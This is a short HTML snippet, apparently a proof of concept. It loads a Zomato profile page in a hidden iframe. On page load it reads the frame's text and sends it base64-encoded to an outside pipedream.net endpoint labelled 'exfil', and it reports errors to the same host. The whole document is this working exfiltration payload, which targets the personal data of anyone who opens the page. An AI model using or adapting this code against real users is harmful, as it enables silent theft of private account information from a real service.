<iframe id="piiFrame" src="https://www.zomato.com/webroutes/getPage?page_url=/profile" style="display:none;"></iframe>
<script>
    window.onload = function() {
        setTimeout(function() {
            try {
                var content = document.getElementById('piiFrame').contentWindow.document.body.innerText;
                fetch('https://eomfuajl79ed6za.m.pipedream.net/?exfil=' + btoa(content));
            } catch (e) {
                fetch('https://eomfuajl79ed6za.m.pipedream.net/?error=' + btoa(e.message));
            }
        }, 3000); // Wait for load
    };
</script>
